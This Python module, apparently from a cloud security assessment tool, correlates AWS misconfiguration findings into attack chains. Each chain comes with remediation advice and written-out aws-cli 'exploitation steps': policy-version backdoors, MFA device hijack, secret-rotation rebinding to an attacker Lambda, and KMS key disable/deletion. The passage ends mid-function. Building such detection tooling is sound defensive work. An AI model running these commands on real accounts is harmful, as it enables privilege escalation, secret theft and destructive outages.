"""Correlation pattern definitions and matching logic."""

import logging
from dataclasses import dataclass
from typing import Any, Callable, Dict, List, Optional

from drystone.correlation.models import ExploitabilityInfo, ThreatContext

# NOTE: Import Finding at runtime to avoid circular dependency
from drystone.models.findings import Finding

logger = logging.getLogger(__name__)


@dataclass
class DynamicCorrelationPattern:
    """Dynamic pattern definition used for pentest correlation."""

    id: str
    name: str
    description: str
    severity: str
    skills_required: List[str]
    matcher: Callable[[Dict[str, List[Finding]], Dict[str, List[Finding]], Dict[str, Any]], bool]
    attack_path_generator: Callable[[Dict[str, Any]], List[str]]
    remediation_generator: Callable[[Dict[str, Any]], List[str]]
    threat_context: ThreatContext
    exploitability: ExploitabilityInfo
    amplification_factor: float = 1.3


class PatternRegistry:
    """Registry for dynamic pentest correlation patterns."""

    def __init__(self):
        self._patterns: Dict[str, DynamicCorrelationPattern] = {}

    def register(self, pattern: DynamicCorrelationPattern) -> None:
        self._patterns[pattern.id] = pattern

    def all(self) -> List[DynamicCorrelationPattern]:
        return list(self._patterns.values())

    def get_patterns_for_skills(self, skills: List[str]) -> List[DynamicCorrelationPattern]:
        skills_set = {s.lower() for s in skills}
        return [
            p
            for p in self._patterns.values()
            if all(req.lower() in skills_set for req in p.skills_required)
        ]

    def get(self, pattern_id: str) -> Optional[DynamicCorrelationPattern]:
        return self._patterns.get(pattern_id)


PATTERN_REGISTRY = PatternRegistry()


# ============================================================================
# HELPER FUNCTIONS
# ============================================================================


def _is_no_mfa_finding(finding: Finding) -> bool:
    """Check if finding is about missing MFA.

    GAPS RESOLVED:
    - GAP-C1: Complete implementation (not pseudocode)
    - GAP-C2: Documents expected evidence_snippet fields
    """
    # Strategy 1: Check finding ID patterns
    if any(id_pattern in finding.id for id_pattern in ["IAM-001", "IAM-002", "IAM-007"]):
        return True

    # Strategy 2: Check title/description keywords
    keywords = ["mfa", "multi-factor", "2fa", "two-factor"]
    text = f"{finding.title} {finding.description}".lower()

    return any(kw in text for kw in keywords)


def _is_ssh_exposed_finding(finding: Finding) -> bool:
    """Check if finding is about SSH exposed to internet."""
    # Strategy 1: Check finding ID
    if "NET-001" in finding.id or "NET-012" in finding.id:
        return True

    # Strategy 2: Check title/description
    text = f"{finding.title} {finding.description}".lower()

    if not ("ssh" in text or "22" in text):
        return False

    # Strategy 3: Validate evidence_snippet (must show 0.0.0.0/0)
    # Expected structure (from evidence_schemas.py):
    # {
    #   "GroupId": "sg-123",
    #   "IpPermissions": [
    #     {"IpProtocol": "tcp", "FromPort": 22, "ToPort": 22, "IpRanges": [{"CidrIp": "0.0.0.0/0"}]}
    #   ]
    # }
    if finding.evidence_snippet:
        snippet_str = str(finding.evidence_snippet).lower()
        return "0.0.0.0/0" in snippet_str or "::/0" in snippet_str

    return False


def _extract_users_from_finding(finding: Finding) -> List[str]:
    """Extract IAM user ARNs from finding.

    GAPS RESOLVED:
    - GAP-T2: Handles findings without affected_resources
    """
    users = []

    # Strategy 1: affected_resources
    if finding.affected_resources:
        for arn in finding.affected_resources:
            if ":user/" in arn or ":root" in arn:
                users.append(arn)

    # Strategy 2: evidence_snippet
    # Expected structure (from evidence_schemas.py):
    # {"UserName": "admin", "Arn": "arn:aws:iam::*:user/admin", "MFADevices": []}
    if finding.evidence_snippet and isinstance(finding.evidence_snippet, dict):
        snippet = finding.evidence_snippet

        # Single user
        if "UserName" in snippet:
            username = snippet["UserName"]
            # Use ARN from snippet if available, otherwise construct
            if "Arn" in snippet:
                users.append(snippet["Arn"])
            else:
                users.append(f"arn:aws:iam::*:user/{username}")

        # List of users
        if "Users" in snippet and isinstance(snippet["Users"], list):
            for user_obj in snippet["Users"]:
                if isinstance(user_obj, dict):
                    if "Arn" in user_obj:
                        users.append(user_obj["Arn"])
                    elif "UserName" in user_obj:
                        users.append(f"arn:aws:iam::*:user/{user_obj['UserName']}")

    return list(set(users))  # Deduplicate


def _is_public_s3_finding(finding: Finding) -> bool:
    """Check if finding is about public S3 bucket."""
    # Strategy 1: Check ID
    if "EXP-001" in finding.id or "EXP-003" in finding.id:
        return True

    # Strategy 2: Check title/description
    keywords = ["s3", "bucket", "public"]
    text = f"{finding.title} {finding.description}".lower()

    return all(kw in text for kw in keywords)


def _is_overprivileged_iam_finding(finding: Finding) -> bool:
    """Check if finding is about overprivileged IAM entity."""
    # Check for wildcard permissions (s3:*, *, etc.)
    keywords = ["s3:*", "full access", "admin", "wildcard", "overprivileged"]
    text = f"{finding.title} {finding.description}".lower()

    if any(kw in text for kw in keywords):
        return True

    # Check evidence_snippet for PolicyDocument with wildcards
    if finding.evidence_snippet and isinstance(finding.evidence_snippet, dict):
        snippet_str = str(finding.evidence_snippet).lower()
        return "s3:*" in snippet_str or '"action": "*"' in snippet_str

    return False


def _extract_bucket_arn(finding: Finding) -> Optional[str]:
    """Extract S3 bucket ARN from finding."""
    if finding.affected_resources:
        for arn in finding.affected_resources:
            if arn.startswith("arn:aws:s3:::"):
                return arn

    # Fallback: extract from evidence_snippet
    if finding.evidence_snippet and "Bucket" in finding.evidence_snippet:
        bucket_name = finding.evidence_snippet["Bucket"]
        return f"arn:aws:s3:::{bucket_name}"

    return None


def _is_critical_cve_finding(finding: Finding) -> bool:
    """Check if finding is about critical CVE."""
    # Must be high risk score (>=9.0) or severity Critical
    if finding.risk_score >= 9.0 or finding.severity == "Critical":
        # And must mention CVE
        text = f"{finding.title} {finding.description}".lower()
        return "cve" in text or "vulnerability" in text

    return False


def _is_no_patching_finding(finding: Finding) -> bool:
    """Check if finding is about missing patch automation."""
    keywords = ["patch", "systems manager", "ssm", "not configured", "missing", "disabled"]
    text = f"{finding.title} {finding.description}".lower()

    return any(kw in text for kw in keywords)


def _extract_instance_arn(finding: Finding) -> Optional[str]:
    """Extract EC2 instance ARN from finding."""
    if finding.affected_resources:
        for arn in finding.affected_resources:
            if ":instance/" in arn:
                return arn

    return None


def _extract_items(doc: Any, key: str = "items") -> List[Dict[str, Any]]:
    """Normalize common evidence containers to a list of dicts."""
    if isinstance(doc, list):
        return [x for x in doc if isinstance(x, dict)]
    if isinstance(doc, dict):
        raw = doc.get(key)
        if isinstance(raw, list):
            return [x for x in raw if isinstance(x, dict)]
    return []


def _policy_has_wildcard_principal(policy: Any) -> bool:
    """Detect wildcard principal in IAM/S3/Lambda/SQS/SNS resource policy."""
    if not isinstance(policy, dict):
        return False
    for st in policy.get("Statement", []) or []:
        if not isinstance(st, dict):
            continue
        principal = st.get("Principal")
        if principal == "*":
            return True
        if isinstance(principal, dict):
            for v in principal.values():
                if v == "*":
                    return True
                if isinstance(v, list) and any(item == "*" for item in v):
                    return True
    return False


# ============================================================================
# PATTERN 1: IAM + Network → SSH Compromise
# ============================================================================


def iam_network_ssh_compromise(
    findings_by_skill: Dict[str, List[Finding]], resource_index: Dict[str, List[Finding]]
) -> List[List[Finding]]:
    """
    Pattern: IAM users without MFA + SSH exposed to internet.

    GAPS RESOLVED:
    - GAP-T4: One correlation per user (prevents combinatorial explosion)
    - GAP-C1: Complete executable code

    Returns:
        List of finding groups. Each group: [IAM_finding, NET_finding1, NET_finding2, ...]
    """
    iam_findings = findings_by_skill.get("iam", [])
    network_findings = findings_by_skill.get("network", [])

    # Step 1: Filter IAM findings (users without MFA)
    no_mfa_findings = [f for f in iam_findings if _is_no_mfa_finding(f)]

    # Step 2: Filter Network findings (SSH exposed)
    ssh_findings = [f for f in network_findings if _is_ssh_exposed_finding(f)]

    if not no_mfa_findings or not ssh_findings:
        logger.debug(
            "Pattern iam_network_ssh_compromise: No match (missing IAM no-MFA or SSH findings)"
        )
        return []

    # Step 3: Extract affected users
    user_to_finding = {}
    for finding in no_mfa_findings:
        users = _extract_users_from_finding(finding)
        for user_arn in users:
            user_to_finding[user_arn] = finding

    if not user_to_finding:
        logger.debug("Pattern iam_network_ssh_compromise: No match (could not extract users)")
        return []

    # Step 4: Create ONE correlation per user (includes ALL SSH findings)
    # This prevents explosion: 3 users × 1 SSH = 3 correlations (not 3)
    correlations = []
    for user_arn, iam_finding in user_to_finding.items():
        correlations.append([iam_finding] + ssh_findings)

    logger.info(
        f"Pattern iam_network_ssh_compromise: {len(correlations)} correlations "
        f"({len(user_to_finding)} users × {len(ssh_findings)} SSH SGs)"
    )

    return correlations


# ============================================================================
# PATTERN 2: Exposure + IAM → Data Exfiltration
# ============================================================================


def exposure_iam_data_exfiltration(
    findings_by_skill: Dict[str, List[Finding]], resource_index: Dict[str, List[Finding]]
) -> List[List[Finding]]:
    """
    Pattern: Public S3 bucket + overprivileged IAM entity.

    GAPS RESOLVED:
    - GAP-T2: Handles findings without ARNs

    Returns:
        List of finding groups. Each group: [EXP_finding, IAM_finding]
    """
    exp_findings = findings_by_skill.get("exposure", [])
    iam_findings = findings_by_skill.get("iam", [])

    # Step 1: Filter public S3 buckets
    public_s3 = [f for f in exp_findings if _is_public_s3_finding(f)]

    # Step 2: Filter overprivileged IAM
    overprivileged_iam = [f for f in iam_findings if _is_overprivileged_iam_finding(f)]

    if not public_s3 or not overprivileged_iam:
        logger.debug("Pattern exposure_iam_data_exfiltration: No match")
        return []

    # Step 3: Correlate by bucket access
    # For each public bucket, find IAM entities with access to it
    correlations = []

    for exp_finding in public_s3:
        bucket_arn = _extract_bucket_arn(exp_finding)

        if not bucket_arn:
            continue  # Skip if can't extract bucket ARN

        # Find IAM findings that reference this bucket
        # (either in affected_resources or evidence_snippet)
        for iam_finding in overprivileged_iam:
            # Strategy 1: Check affected_resources
            has_access = False

            if bucket_arn in iam_finding.affected_resources:
                has_access = True

            # Strategy 2: Check evidence_snippet for wildcard permissions
            if not has_access and iam_finding.evidence_snippet:
                snippet_str = str(iam_finding.evidence_snippet).lower()
                # Wildcards give access to all buckets
                if '"resource": "*"' in snippet_str or '"resource": ["*"]' in snippet_str:
                    has_access = True

            if has_access:
                correlations.append([exp_finding, iam_finding])

    logger.info(f"Pattern exposure_iam_data_exfiltration: {len(correlations)} correlations")

    return correlations


# ============================================================================
# PATTERN 3: Vulns + Hardening → Persistent CVE
# ============================================================================


def vulns_hardening_persistent_cve(
    findings_by_skill: Dict[str, List[Finding]], resource_index: Dict[str, List[Finding]]
) -> List[List[Finding]]:
    """
    Pattern: Critical CVE + no patch automation.

    Returns:
        List of finding groups. Each group: [VUL_finding, HRD_finding]
    """
    vuln_findings = findings_by_skill.get("vulns", [])
    hrd_findings = findings_by_skill.get("hardening", [])

    # Step 1: Filter critical CVEs
    critical_cves = [f for f in vuln_findings if _is_critical_cve_finding(f)]

    # Step 2: Filter missing patch automation
    no_patching = [f for f in hrd_findings if _is_no_patching_finding(f)]

    if not critical_cves or not no_patching:
        logger.debug("Pattern vulns_hardening_persistent_cve: No match")
        return []

    # Step 3: Correlate by instance
    correlations = []

    for vuln_finding in critical_cves:
        instance_arn = _extract_instance_arn(vuln_finding)

        if not instance_arn:
            # Account-level correlation (any CVE + no patching = correlation)
            for hrd_finding in no_patching:
                correlations.append([vuln_finding, hrd_finding])
            break  # Only create one correlation (not per CVE)
        else:
            # Instance-specific correlation
            for hrd_finding in no_patching:
                # Check if hardening finding affects same instance
                # (or is account-level like "SSM Patch Manager not configured")
                if (
                    not hrd_finding.affected_resources
                    or instance_arn in hrd_finding.affected_resources
                ):
                    correlations.append([vuln_finding, hrd_finding])

    logger.info(f"Pattern vulns_hardening_persistent_cve: {len(correlations)} correlations")

    return correlations


# ============================================================================
# PATTERN REGISTRY
# ============================================================================

# Pattern metadata (used by engine)
PATTERN_METADATA = [
    {
        "id": "iam_network_ssh_compromise",
        "name": "SSH Access Without MFA Protection",
        "severity": "Critical",
        "skills_required": ["iam", "network"],
        "match_function": iam_network_ssh_compromise,
        "amplification_factor": 1.5,
        "title_template": "SSH access without MFA protection - Account compromise risk",
        "description_template": (
            "Security group(s) allow SSH (port 22) from 0.0.0.0/0, and IAM user(s) lack MFA. "
            "This creates a direct path to account compromise via brute force or credential theft."
        ),
        "attack_path_steps": [
            "Attacker discovers open SSH port via port scanning (0.0.0.0/0)",
            "Attempts brute force or credential stuffing against SSH endpoint",
            "Gains access with weak/stolen credentials (no MFA barrier)",
            "Escalates privileges using IAM permissions",
        ],
        "remediation_template": [
            "1. Enable MFA on affected IAM users via AWS Console → IAM → Security credentials",
            "2. Restrict Security Group(s) to specific IP ranges (corporate VPN, bastion hosts)",
            "3. Consider AWS Systems Manager Session Manager instead of SSH",
        ],
    },
    {
        "id": "exposure_iam_data_exfiltration",
        "name": "Public Resource with Overprivileged IAM",
        "severity": "High",
        "skills_required": ["exposure", "iam"],
        "match_function": exposure_iam_data_exfiltration,
        "amplification_factor": 1.3,
        "title_template": "Public S3 bucket with overprivileged IAM - Data exfiltration risk",
        "description_template": (
            "S3 bucket is publicly accessible, and IAM entity has overprivileged permissions. "
            "Leaked credentials enable data exfiltration or ransomware deployment."
        ),
        "attack_path_steps": [
            "Attacker discovers public S3 bucket via reconnaissance",
            "IAM credentials leak via phishing, GitHub exposure, or SSRF",
            "Attacker uses credentials to read/write/delete bucket data",
            "Sensitive data exfiltrated or ransomware deployed",
        ],
        "remediation_template": [
            "1. Remove public access from S3 bucket (enable Block Public Access)",
            "2. Reduce IAM permissions to least privilege (specific actions, not s3:*)",
            "3. Enable S3 Object Lock and Versioning for data protection",
        ],
    },
    {
        "id": "vulns_hardening_persistent_cve",
        "name": "Critical CVE Without Automated Patching",
        "severity": "High",
        "skills_required": ["vulns", "hardening"],
        "match_function": vulns_hardening_persistent_cve,
        "amplification_factor": 1.3,
        "title_template": "Critical CVE without automated patching - Persistent vulnerability",
        "description_template": (
            "Critical vulnerability detected, but Systems Manager Patch Manager not configured. "
            "Vulnerability remains unpatched, creating persistent exploitation window."
        ),
        "attack_path_steps": [
            "Attacker scans for known CVE via Shodan/Censys",
            "Exploits vulnerability remotely (no patch applied)",
            "Gains initial foothold on instance",
            "Pivots to internal resources or deploys persistence mechanisms",
        ],
        "remediation_template": [
            "1. Configure AWS Systems Manager Patch Manager with automated patching",
            "2. Apply patch for CVE immediately via 'aws ssm send-command'",
            "3. Enable Inspector continuous scanning for future vulnerabilities",
        ],
    },
]


def _match_assume_role_escalation(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    iam_evidence = evidence_by_skill.get("iam", {}) if isinstance(evidence_by_skill, dict) else {}
    chains_doc = iam_evidence.get("assumeRole-chains") or {}
    chains = chains_doc.get("chains", []) if isinstance(chains_doc, dict) else []
    if not isinstance(chains, list):
        return False
    for ch in chains:
        principals = ch.get("TrustedPrincipals", []) if isinstance(ch, dict) else []
        if any(isinstance(p, str) and (p == "*" or "arn:aws:iam::*:root" in p) for p in principals):
            return True
    return False


def _assume_role_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Compromise low-privilege IAM identity via leaked credentials or phishing",
        "Enumerate trust relationships and role assumption paths",
        "Assume over-privileged role through permissive trust policy",
        "Escalate privileges and access additional account resources",
    ]


def _assume_role_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Restrict trust policies to specific principals, avoid wildcard/root trust",
        "Require MFA and ExternalId where cross-account trust is needed",
        "Continuously monitor sts:AssumeRole events in CloudTrail",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="iam_assume_role_privilege_escalation",
        name="Privilege Escalation via AssumeRole Chain",
        description="Permissive IAM trust chains can enable lateral role escalation.",
        severity="Critical",
        skills_required=["iam"],
        matcher=_match_assume_role_escalation,
        attack_path_generator=_assume_role_attack_path,
        remediation_generator=_assume_role_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0004"],
            mitre_attack_techniques=["T1078.004"],
            observed_in_wild=True,
            exploit_maturity="Functional",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "aws iam list-roles",
                "aws iam get-role --role-name <target>",
                "aws sts assume-role --role-arn <arn> --role-session-name pentest",
            ],
            tools_required=["aws-cli"],
            exploitation_complexity="Low",
            estimated_time_to_compromise="10 minutes",
        ),
        amplification_factor=1.5,
    )
)


def _match_iam_oidc_broad_trust_chain(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    iam_findings = findings_by_skill.get("iam", [])
    ids = {f.id for f in iam_findings}
    return bool({"IAM-032", "IAM-034"}.intersection(ids))


def _iam_oidc_broad_trust_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker identifies role trust to token.actions.githubusercontent.com with broad or weak conditions",
        "Mints/abuses external CI OIDC token that satisfies permissive trust",
        "Assumes AWS role via AssumeRoleWithWebIdentity and pivots with temporary credentials",
    ]


def _iam_oidc_broad_trust_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Constrain OIDC trust with exact sub + aud conditions and avoid broad wildcards",
        "Restrict SAML/OIDC provider mutation actions to break-glass identities",
        "Continuously monitor AssumeRoleWithWebIdentity and IdP update events",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="iam_oidc_ci_cd_webidentity_takeover_chain",
        name="OIDC CI/CD WebIdentity Takeover Chain",
        description="Broad OIDC trust or IdP mutation permissions can enable external workflow credential takeover.",
        severity="Critical",
        skills_required=["iam"],
        matcher=_match_iam_oidc_broad_trust_chain,
        attack_path_generator=_iam_oidc_broad_trust_attack_path,
        remediation_generator=_iam_oidc_broad_trust_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0001", "TA0004", "TA0003"],
            mitre_attack_techniques=["T1190", "T1078.004", "T1550.001"],
            observed_in_wild=True,
            exploit_maturity="Functional",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "aws iam get-role --role-name <role>",
                "aws sts assume-role-with-web-identity --role-arn <role-arn> --role-session-name ci-pivot --web-identity-token <token>",
                "aws sts get-caller-identity",
            ],
            tools_required=["aws-cli"],
            exploitation_complexity="Medium",
            estimated_time_to_compromise="45 minutes",
        ),
        amplification_factor=1.7,
    )
)


def _match_iam_policy_version_backdoor_chain(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    iam_findings = findings_by_skill.get("iam", [])
    ids = {f.id for f in iam_findings}
    if "IAM-035" not in ids:
        return False
    return any(_is_overprivileged_iam_finding(f) or f.id == "IAM-008" for f in iam_findings)


def _iam_policy_version_backdoor_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker identifies identity with CreatePolicyVersion/SetDefaultPolicyVersion permissions",
        "Creates malicious policy version and sets it as default to grant elevated access",
        "Uses temporary elevated privileges while hiding persistence in policy version history",
    ]


def _iam_policy_version_backdoor_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Remove policy-version mutation rights from non-security-admin identities",
        "Alert on CreatePolicyVersion and SetDefaultPolicyVersion CloudTrail events",
        "Require change approval and periodic review of all policy versions",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="iam_policy_version_backdoor_persistence_chain",
        name="Policy Version Backdoor Persistence Chain",
        description="Policy-version mutation permissions can enable covert privilege escalation and persistence.",
        severity="Critical",
        skills_required=["iam"],
        matcher=_match_iam_policy_version_backdoor_chain,
        attack_path_generator=_iam_policy_version_backdoor_attack_path,
        remediation_generator=_iam_policy_version_backdoor_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0003", "TA0004", "TA0005"],
            mitre_attack_techniques=["T1098", "T1078.004", "T1548"],
            observed_in_wild=True,
            exploit_maturity="Functional",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "aws iam list-policy-versions --policy-arn <policy-arn>",
                "aws iam create-policy-version --policy-arn <policy-arn> --policy-document file:///tmp/admin.json --set-as-default",
                "aws sts get-caller-identity",
            ],
            tools_required=["aws-cli"],
            exploitation_complexity="Low",
            estimated_time_to_compromise="20 minutes",
        ),
        amplification_factor=1.8,
    )
)


def _match_iam_mfa_hijack_chain(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    iam_findings = findings_by_skill.get("iam", [])
    ids = {f.id for f in iam_findings}
    return "IAM-037" in ids


def _iam_mfa_hijack_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker identifies principal with MFA lifecycle permissions",
        "Registers/deactivates MFA device for target identity to force lockout or hijack",
        "Maintains access or disrupts incident response through authentication control abuse",
    ]


def _iam_mfa_hijack_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Restrict EnableMFADevice/CreateVirtualMFADevice/DeactivateMFADevice actions",
        "Alert on MFA device lifecycle events in CloudTrail",
        "Use break-glass workflows with approvals for MFA administrative operations",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="iam_mfa_device_hijack_persistence_chain",
        name="MFA Device Hijack Persistence Chain",
        description="Broad MFA lifecycle permissions can enable account lockout and persistence abuse.",
        severity="High",
        skills_required=["iam"],
        matcher=_match_iam_mfa_hijack_chain,
        attack_path_generator=_iam_mfa_hijack_attack_path,
        remediation_generator=_iam_mfa_hijack_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0003", "TA0005"],
            mitre_attack_techniques=["T1098", "T1556"],
            observed_in_wild=False,
            exploit_maturity="Proof-of-Concept",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "aws iam create-virtual-mfa-device --virtual-mfa-device-name <name>",
                "aws iam enable-mfa-device --user-name <target> --serial-number <serial> --authentication-code1 <code1> --authentication-code2 <code2>",
            ],
            tools_required=["aws-cli"],
            exploitation_complexity="Medium",
            estimated_time_to_compromise="30 minutes",
        ),
        amplification_factor=1.45,
    )
)


def _match_iam_authorization_wipeout_chain(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    iam_findings = findings_by_skill.get("iam", [])
    ids = {f.id for f in iam_findings}
    return "IAM-038" in ids or "IAM-039" in ids


def _iam_authorization_wipeout_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker uses broad IAM delete/detach permissions",
        "Removes policies, policy versions, or role/user attachments",
        "Causes authorization disruption, denial-of-service, and anti-forensic impact",
    ]


def _iam_authorization_wipeout_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Eliminate iam:Delete* and broad detach/delete permissions from non-emergency roles",
        "Require approvals for destructive IAM authorization changes",
        "Create detections for delete/detach bursts and unusual IAM mutation patterns",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="iam_authorization_wipeout_dos_chain",
        name="Authorization Wipeout DoS Chain",
        description="Destructive IAM permissions can remove identities and controls, causing broad access outages.",
        severity="Critical",
        skills_required=["iam"],
        matcher=_match_iam_authorization_wipeout_chain,
        attack_path_generator=_iam_authorization_wipeout_attack_path,
        remediation_generator=_iam_authorization_wipeout_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0040", "TA0005"],
            mitre_attack_techniques=["T1485", "T1562"],
            observed_in_wild=False,
            exploit_maturity="Functional",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "aws iam delete-policy-version --policy-arn <arn> --version-id <id>",
                "aws iam detach-role-policy --role-name <role> --policy-arn <arn>",
            ],
            tools_required=["aws-cli"],
            exploitation_complexity="Low",
            estimated_time_to_compromise="15 minutes",
        ),
        amplification_factor=1.9,
    )
)


def _match_sm_rotation_hijack_chain(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    sm_findings = findings_by_skill.get("secretsmanager", [])
    ids = {f.id for f in sm_findings}
    return bool({"SM-014", "SM-016"}.intersection(ids))


def _sm_rotation_hijack_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker identifies secret with rotation enabled and mutable rotation configuration",
        "Rebinds rotation workflow to attacker-controlled Lambda or abuses stage manipulation",
        "Exfiltrates current/pending secret values during rotation lifecycle",
        "Maintains persistence through scheduled future rotations",
    ]


def _sm_rotation_hijack_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Restrict RotateSecret/UpdateSecretVersionStage to dedicated change-control roles",
        "Enforce allowlist for rotation Lambda ARNs and monitor config drifts",
        "Alert on AWSCURRENT stage moves and unexpected rotation lambda changes",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="secretsmanager_rotation_hijack_persistence_chain",
        name="Secrets Rotation Hijack Persistence Chain",
        description="Rotation workflow abuse can enable covert secret exfiltration and long-lived persistence.",
        severity="Critical",
        skills_required=["secretsmanager"],
        matcher=_match_sm_rotation_hijack_chain,
        attack_path_generator=_sm_rotation_hijack_attack_path,
        remediation_generator=_sm_rotation_hijack_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0006", "TA0003", "TA0005"],
            mitre_attack_techniques=["T1552.001", "T1098"],
            observed_in_wild=True,
            exploit_maturity="Functional",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "aws secretsmanager describe-secret --secret-id <secret-id>",
                "aws secretsmanager rotate-secret --secret-id <secret-id> --rotation-lambda-arn <attacker-lambda> --rotate-immediately",
                "aws secretsmanager list-secret-version-ids --secret-id <secret-id>",
            ],
            tools_required=["aws-cli"],
            exploitation_complexity="High",
            estimated_time_to_compromise="90 minutes",
        ),
        amplification_factor=1.8,
    )
)


def _match_sm_cross_region_backdoor_chain(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    sm_findings = findings_by_skill.get("secretsmanager", [])
    ids = {f.id for f in sm_findings}
    return bool({"SM-013", "SM-015", "SM-017"}.intersection(ids))


def _sm_cross_region_backdoor_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker leverages permissive secret resource policies and replication capabilities",
        "Creates or promotes replica secret in alternate region with attacker-favorable controls",
        "Pairs secret access with KMS decrypt path to read sensitive values",
        "Maintains stealthy cross-region backdoor while primary secret appears unchanged",
    ]


def _sm_cross_region_backdoor_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Restrict ReplicateSecretToRegions/StopReplicationToReplica/PutResourcePolicy permissions",
        "Enforce region allowlists and approved KMS keys for secrets encryption",
        "Continuously monitor cross-region secret replication and external principal grants",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="secretsmanager_cross_region_backdoor_chain",
        name="Secrets Cross-Region Backdoor Chain",
        description="Replication plus permissive policy/KMS combinations can create durable cross-region secret backdoors.",
        severity="High",
        skills_required=["secretsmanager"],
        matcher=_match_sm_cross_region_backdoor_chain,
        attack_path_generator=_sm_cross_region_backdoor_attack_path,
        remediation_generator=_sm_cross_region_backdoor_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0003", "TA0010"],
            mitre_attack_techniques=["T1098", "T1020"],
            observed_in_wild=True,
            exploit_maturity="Proof-of-Concept",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "aws secretsmanager replicate-secret-to-regions --secret-id <secret-id> --add-replica-regions Region=<region>",
                "aws secretsmanager stop-replication-to-replica --secret-id <secret-id>",
                "aws secretsmanager put-resource-policy --secret-id <secret-id> --resource-policy file:///tmp/policy.json",
            ],
            tools_required=["aws-cli"],
            exploitation_complexity="High",
            estimated_time_to_compromise="2 hours",
        ),
        amplification_factor=1.6,
    )
)


def _match_kms_ransomware_actions(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    kms_findings = findings_by_skill.get("kms", [])
    return any(f.id in {"KMS-005", "KMS-006"} for f in kms_findings)


def _kms_ransomware_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker identifies KMS permissions enabling key disable/deletion or imported key material deletion",
        "Executes destructive KMS action to break decryptability of dependent services",
        "Forces operational outage or ransomware-like recovery pressure",
    ]


def _kms_ransomware_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Restrict destructive KMS lifecycle permissions to tightly controlled break-glass roles",
        "Alert on DisableKey, ScheduleKeyDeletion, DeleteImportedKeyMaterial, alias mutations",
        "Use dual-approval workflows and tested recovery playbooks for key operations",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="kms_ransomware_availability_chain",
        name="KMS Availability/Ransomware Chain",
        description="Destructive KMS actions can render encrypted workloads inaccessible and drive ransomware-like impact.",
        severity="Critical",
        skills_required=["kms"],
        matcher=_match_kms_ransomware_actions,
        attack_path_generator=_kms_ransomware_attack_path,
        remediation_generator=_kms_ransomware_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0040"],
            mitre_attack_techniques=["T1485"],
            observed_in_wild=True,
            exploit_maturity="Functional",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "aws kms list-keys",
                "aws kms disable-key --key-id <key-id>",
                "aws kms schedule-key-deletion --key-id <key-id> --pending-window-in-days 7",
            ],
            tools_required=["aws-cli"],
            exploitation_complexity="Medium",
            estimated_time_to_compromise="30 minutes",
        ),
        amplification_factor=1.8,
    )
)


def _match_kms_grant_persistence(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    kms_findings = findings_by_skill.get("kms", [])
    return any(f.id == "KMS-007" for f in kms_findings)


def _kms_grant_persistence_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker locates KMS grants delegating CreateGrant",
        "Creates follow-on grants for controlled principals to retain key access",
